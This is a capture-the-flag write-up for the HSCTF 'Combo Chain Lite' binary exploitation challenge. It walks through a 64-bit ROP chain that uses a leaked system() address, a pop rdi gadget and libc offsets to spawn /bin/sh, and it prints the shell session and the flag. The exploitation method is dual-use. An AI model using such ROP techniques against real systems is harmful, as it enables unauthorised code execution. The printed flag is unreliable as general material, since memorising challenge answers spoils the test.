# Combo Chain Lite
Binary Exploitation

## Challenge 

Training wheels!

nc pwn.hsctf.com 3131

## Hint
What's a ROP?

## Solution

Given 64 bit ELF binary to do ROP.

Reference: https://medium.com/@int0x33/day-3-rop-emporium-split-64bit-338b5edccf1a

#### Libc version

    # nc pwn.hsctf.com 3131
    Here's your free computer: 0x7ff326eda390
    Dude you hear about that new game called /bin/sh? Enter the right combo for some COMBO CARNAGE!: ^C

Do search on libc.blukat.me for `390`.

- https://libc.blukat.me/?q=system%3A390&l=libc6_2.23-0ubuntu11_amd64
- libc6_2.23-0ubuntu11_amd64

#### Form payload

The payload should be as follows:
    
    offset_padding + pop_rdi_gadget + str_bin_sh + system_addr

Offset padding is 16 bytes

    # pwn cyclic 100 | strace ./combo-chain-lite | tail -5
    --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x61616165} ---
    +++ killed by SIGSEGV +++
    Segmentation fault
    
    # pwn cyclic -l 0x61616165
    16

Pop rdi gadget

    # ROPgadget --binary combo-chain-lite | grep 'pop rdi'
    0x0000000000401273 : pop rdi ; ret

Calculate str_bin_sh using the above libc version: https://libc.blukat.me/?q=system%3A390&l=libc6_2.23-0ubuntu11_amd64

    Symbol      Offset      Difference
    system      0x045390    0x0
    open        0x0f7030    0xb1ca0
    read        0x0f7250    0xb1ec0
    write       0x0f72b0    0xb1f20
    str_bin_sh  0x18cd57    0x1479c7

#### Get flag

    # python solve_pwntools.py 
    [+] Opening connection to pwn.hsctf.com on port 3131: Done
    ('system():', '0x7f2dcd87d390')
    [*] Switching to interactive mode
    Dude you hear about that new game called /bin/sh? Enter the right combo for some COMBO CARNAGE!: $ ls
    bin
    combo-chain-lite
    combo-chain-lite.c
    dev
    flag
    lib
    lib32
    lib64
    $ cat flag
    hsctf{wheeeeeee_that_was_fun}

## Flag

    hsctf{wheeeeeee_that_was_fun}
